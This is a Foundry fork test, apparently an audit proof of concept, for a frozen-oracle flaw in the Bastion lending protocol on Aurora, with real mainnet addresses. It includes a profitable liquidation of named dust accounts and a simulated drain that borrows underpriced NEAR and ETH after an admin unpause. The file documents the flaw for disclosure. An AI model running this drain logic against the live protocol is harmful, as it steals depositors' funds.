// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

/*
 * C2-19 — Bastion (Aurora) fork PoC — READ-ONLY mainnet; fork-only, no mainnet txs.
 *
 * Two clearly separated questions:
 *   (1) TODAY: unprivileged extraction live right now.
 *       -> mint/borrow paused on all 5 markets; price oracle frozen at 2026-08-03 values;
 *          the only live value path is liquidations, and those are dust (~$96 gross total
 *          across 281 shortfall accounts; larger accounts are unbacked bad debt).
 *   (2) LATENT (labelled): the single state flip that opens the drain is a mint+borrow
 *       UNPAUSE while the oracle is still frozen. Simulated on the fork via vm.prank of the
 *       2-of-5 admin Safe; the exploit itself is fully permissionless and worth ~$50-66k
 *       (borrow the underpriced NEAR/ETH against stablecoin collateral, then walk away).
 *
 * All state changes happen on the local fork only.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICToken {
    function mint(uint256) external returns (uint256);
    function redeem(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function getCash() external view returns (uint256);
    function accrueInterest() external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
}

interface ICEther {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IComptroller {
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
    function mintGuardianPaused(address) external view returns (bool);
    function borrowGuardianPaused(address) external view returns (bool);
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function _setMintPaused(address cToken, bool state) external returns (bool);
    function _setBorrowPaused(address cToken, bool state) external returns (bool);
}

interface IOracle {
    function price(string calldata symbol) external view returns (uint256);
    function validate(address cToken) external returns (bool);
    function pokeFailedOverPrice(bytes32 symbolHash) external;
    function activateFailover(bytes32 symbolHash) external;
}

contract BastionTest is Test {
    // ---- Bastion (C2-19) addresses, Aurora mainnet ----
    address constant UNITROLLER = 0x6De54724e128274520606f038591A00C5E94a1F6;
    address constant ORACLE     = 0xCa3F5f5a16ec993f933C9dCc40b929a26ef9Ce0d;
    address constant ADMIN_SAFE = 0x4f44d184908AE367CAD0cb1b332A11545d76Bc87; // 2-of-5 Gnosis Safe
    address constant cETH  = 0x4E8fE8fd314cFC09BDb0942c5adCC37431abDCD0;
    address constant cNEAR = 0x8C14ea853321028a7bb5E4FB0d0147F183d3B677;
    address constant cUSDC = 0xe5308dc623101508952948b141fD9eaBd3337D99;
    address constant cUSDT = 0x845E15A441CFC1871B7AC610b0E922019BaD9826;
    address constant cWBTC = 0xfa786baC375D8806185555149235AcDb182C033b;
    address constant USDC  = 0xB12BFcA5A55806AaF64E99521918A4bf0fC40802;
    address constant USDT  = 0x4988a896b1227218e4A686fdE5EabdcAbd91571f;
    address constant WNEAR = 0xC42C30aC6Cc15faC9bD938618BcaA1a1FaE8501d;

    bytes32 constant ETH_HASH = 0xaaaebeba3810b1e6b70781f14b2d72c1cb89c0b2b320c43bb67ff79f562f5ff4;

    // ---- Frozen oracle prices (stored values, last updated 2026-08-03; 6-decimal USD) ----
    uint256 constant ORACLE_ETH_6  = 1848474798; // $1,848.474798
    uint256 constant ORACLE_NEAR_6 = 1325163;    // $1.325163
    // ---- Reference real prices (DefiLlama 2026-10-09) ----
    uint256 constant REAL_NEAR = 4.4015166e18;   // $/NEAR
    uint256 constant REAL_ETH  = 2421.2865e18;   // $/ETH
    // ---- Conservative prices for pass/fail (drawdown-proof) ----
    uint256 constant CONS_NEAR = 4.0e18;
    uint256 constant CONS_ETH  = 2300e18;

    uint256 constant CF_USDC = 0.85e18;                       // cUSDC collateral factor
    uint256 constant RATE_NEAR = 2041852920786852104364883499804576; // cNEAR exchangeRateStored
    uint256 constant RATE_SCALE_NEAR = 1e34;                  // 1e(18+24-8)

    IComptroller comp = IComptroller(UNITROLLER);
    IOracle oracle = IOracle(ORACLE);

    address attacker = address(0xA11CE);
    address attacker2 = address(0xB0B);

    function setUp() public {
        string memory rpc = vm.envOr("AURORA_RPC_URL", string("https://mainnet.aurora.dev"));
        vm.createSelectFork(rpc);
    }

    /// @dev raw base units of `dec` decimals -> USD 1e18
    function usd(uint256 raw, uint256 dec, uint256 price1e18) internal pure returns (uint256) {
        return raw * price1e18 / (10 ** dec);
    }

    /// @dev cNEAR (8dp) -> whole NEAR, 1e18-scaled
    function nearWhole1e18(uint256 cTokens) internal pure returns (uint256) {
        // cTokens are 8dp; RATE_NEAR is scaled 1e(18+24-8)=1e34 per cToken
        return cTokens * RATE_NEAR / 1e24; // 1e8 (cToken dp) * 1e34 (rate scale) / 1e18 (fix) = 1e24
    }

    function _markets() internal pure returns (address[5] memory m) {
        m = [cETH, cNEAR, cUSDC, cUSDT, cWBTC];
    }

    // =====================================================================
    // (1) TODAY — everything closed except dust liquidations
    // =====================================================================
    function test_C2_19_today_paused_and_oracle_frozen() public {
        address[5] memory ms = _markets();
        for (uint256 i = 0; i < ms.length; i++) {
            assertTrue(comp.mintGuardianPaused(ms[i]), "mint should be paused");
            assertTrue(comp.borrowGuardianPaused(ms[i]), "borrow should be paused");
        }
        assertEq(oracle.price("ETH"), ORACLE_ETH_6, "ETH stale price changed");
        assertEq(oracle.price("NEAR"), ORACLE_NEAR_6, "NEAR stale price changed");
        emit log_named_uint("oracle ETH (6dp)", oracle.price("ETH"));
        emit log_named_uint("oracle NEAR (6dp)", oracle.price("NEAR"));

        // Unprivileged mint path closed
        vm.prank(address(cUSDC));
        IERC20(USDC).transfer(attacker, 10_000e6);
        vm.startPrank(attacker);
        IERC20(USDC).approve(cUSDC, type(uint256).max);
        vm.expectRevert(bytes("mint is paused"));
        ICToken(cUSDC).mint(1_000e6);
        vm.stopPrank();

        // Unprivileged borrow path closed
        vm.prank(attacker);
        vm.expectRevert(bytes("borrow is paused"));
        ICToken(cNEAR).borrow(1e8);
    }

    function test_C2_19_today_oracle_refresh_paths_are_privileged_or_dead() public {
        uint256 before = oracle.price("ETH");
        // validate() from an arbitrary address does NOT update the stored price today
        vm.prank(attacker);
        bool ok = oracle.validate(cETH);
        assertFalse(ok, "validate unexpectedly succeeded - oracle thawed?");
        assertEq(oracle.price("ETH"), before, "price changed unexpectedly");

        // failover paths are owner-gated / inactive
        vm.prank(attacker);
        vm.expectRevert(bytes("Failover must be active"));
        oracle.pokeFailedOverPrice(ETH_HASH);
        vm.prank(attacker);
        vm.expectRevert(bytes("Only callable by owner"));
        oracle.activateFailover(ETH_HASH);
    }

    /// TODAY: liquidations are live (seize not paused). Best-case dust account.
    function test_C2_19_today_liquidation_is_live_but_dust() public {
        address[3] memory candidates = [
            0xba10C358599fa3DCdF73f454cC1C29400c37AaB3, // cUSDC debt, cNEAR collateral
            0xF89eb7b7BF79738397cA2F2Ab3De37Aec1be562e, // cUSDT debt, cNEAR collateral
            0x0Dd70CE6fb66D7158Cb394cAa70Cb8C6340B1fd3  // cUSDC debt, cNEAR collateral
        ];
        address victim;
        address cDebt;
        address token;
        for (uint256 i = 0; i < candidates.length; i++) {
            (, , uint256 sf) = comp.getAccountLiquidity(candidates[i]);
            uint256 dUsdc = ICToken(cUSDC).borrowBalanceStored(candidates[i]);
            uint256 dUsdt = ICToken(cUSDT).borrowBalanceStored(candidates[i]);
            if (sf > 0 && (dUsdc > 0 || dUsdt > 0)) {
                victim = candidates[i];
                cDebt = dUsdc > 0 ? cUSDC : cUSDT;
                token = dUsdc > 0 ? USDC : USDT;
                break;
            }
        }
        require(victim != address(0), "no dust account available anymore");

        (, , uint256 shortfall) = comp.getAccountLiquidity(victim);
        emit log_named_uint("dust victim shortfall (1e18 USD)", shortfall);
        require(shortfall > 0, "victim not liquidatable");

        ICToken(cDebt).accrueInterest();
        uint256 debt = ICToken(cDebt).borrowBalanceStored(victim);
        uint256 repay = debt * 49 / 100;

        vm.prank(cDebt);
        IERC20(token).transfer(attacker, repay);
        vm.startPrank(attacker);
        IERC20(token).approve(cDebt, repay);
        uint256 nearBefore = ICToken(cNEAR).balanceOf(attacker);
        ICToken(cDebt).liquidateBorrow(victim, repay, cNEAR);
        uint256 seized = ICToken(cNEAR).balanceOf(attacker) - nearBefore;
        vm.stopPrank();

        uint256 seizeOracleUsd = nearWhole1e18(seized) * (ORACLE_NEAR_6 * 1e12) / 1e18;
        uint256 repayOracleUsd = usd(repay, 6, 1.000065e18);
        emit log_named_uint("repay (token units, 6dp)", repay);
        emit log_named_uint("seized cNEAR (8dp)", seized);
        emit log_named_uint("seize oracle USD (1e18)", seizeOracleUsd);
        emit log_named_uint("repay oracle USD (1e18)", repayOracleUsd);
        assertGt(seizeOracleUsd, repayOracleUsd, "liquidation bonus must be positive");

        uint256 seizeRealUsd = nearWhole1e18(seized) * REAL_NEAR / 1e18;
        uint256 repayRealUsd = usd(repay, 6, 0.9996e18);
        emit log_named_uint("liquidation real profit USD (1e18)", seizeRealUsd - repayRealUsd);
        assertGt(seizeRealUsd, repayRealUsd, "real profit must be positive");
    }

    /// TODAY: supplier redemptions are open (H-O) — a real holder can still redeem.
    function test_C2_19_today_redeem_open_holder_only() public {
        address holder = 0x7B7B957c284C2C227C980d6E2F804311947b84d0; // top cUSDC holder
        uint256 usdcBefore = IERC20(USDC).balanceOf(holder);
        vm.prank(holder);
        ICToken(cUSDC).redeem(1_000_000); // 0.01 cUSDC
        assertGt(IERC20(USDC).balanceOf(holder), usdcBefore, "redeem should work (H-O)");
    }

    // =====================================================================
    // (2) LATENT (labelled) — single flip: admin unpauses mint+borrow; oracle stays frozen.
    //     PRIVILEGED trigger, then fully permissionless to exploit.
    // =====================================================================
    function test_C2_19_LATENT_unpause_drain() public {
        // Before the flip: any borrow reverts
        vm.prank(attacker2);
        vm.expectRevert(bytes("borrow is paused"));
        ICToken(cNEAR).borrow(1e8);

        // --- THE STATE FLIP (admin-only in reality; simulated via vm.prank) ---
        address[5] memory ms = _markets();
        vm.startPrank(ADMIN_SAFE);
        for (uint256 i = 0; i < ms.length; i++) {
            comp._setMintPaused(ms[i], false);
            comp._setBorrowPaused(ms[i], false);
        }
        vm.stopPrank();
        for (uint256 i = 0; i < ms.length; i++) {
            assertFalse(comp.mintGuardianPaused(ms[i]));
            assertFalse(comp.borrowGuardianPaused(ms[i]));
        }

        // Attacker supplies stablecoin collateral (USDC, CF 0.85) and borrows the
        // underpriced assets. Oracle still frozen -> NEAR counted at $1.325 vs real $4.40.
        uint256 nearBorrow = ICToken(cNEAR).getCash() * 99 / 100;
        uint256 ethBorrow = ICEther(cETH).getCash() * 99 / 100;

        uint256 nearOracleUsd = usd(nearBorrow, 24, ORACLE_NEAR_6 * 1e12); // 1e18 USD
        uint256 ethOracleUsd = usd(ethBorrow, 18, ORACLE_ETH_6 * 1e12);
        uint256 supplyUsd = (nearOracleUsd + ethOracleUsd) * 1e18 / CF_USDC * 102 / 100;
        uint256 usdcSupply = supplyUsd / 1e12; // USD 1e18 -> USDC 6dp

        vm.prank(cUSDC);
        IERC20(USDC).transfer(attacker2, usdcSupply);
        vm.startPrank(attacker2);
        IERC20(USDC).approve(cUSDC, type(uint256).max);
        require(ICToken(cUSDC).mint(usdcSupply) == 0, "mint failed");
        address[] memory entered = new address[](1);
        entered[0] = cUSDC;
        comp.enterMarkets(entered);
        require(ICToken(cNEAR).borrow(nearBorrow) == 0, "NEAR borrow failed");
        uint256 ethBefore = attacker2.balance;
        require(ICEther(cETH).borrow(ethBorrow) == 0, "ETH borrow failed");
        vm.stopPrank();

        uint256 nearGot = IERC20(WNEAR).balanceOf(attacker2);
        uint256 ethGot = attacker2.balance - ethBefore;

        emit log_named_uint("LATENT usdc supplied", usdcSupply);
        emit log_named_uint("LATENT NEAR borrowed (24dp)", nearGot);
        emit log_named_uint("LATENT ETH borrowed (18dp)", ethGot);

        uint256 gotCons = usd(nearGot, 24, CONS_NEAR) + usd(ethGot, 18, CONS_ETH);
        uint256 spentCons = usd(usdcSupply, 6, 1e18);
        emit log_named_uint("LATENT net @ conservative (USD 1e18)", gotCons - spentCons);
        uint256 gotDl = usd(nearGot, 24, REAL_NEAR) + usd(ethGot, 18, REAL_ETH);
        emit log_named_uint("LATENT net @ DefiLlama (USD 1e18)", gotDl - spentCons);

        assertGt(gotCons, spentCons + 40_000e18, "latent drain should exceed $40k conservative");
        // The protocol's underpriced cash is drained
        assertLt(ICToken(cNEAR).getCash(), 210e24, "NEAR cash not drained");
        assertLt(ICEther(cETH).getCash(), 0.31e18, "ETH cash not drained");
    }
}
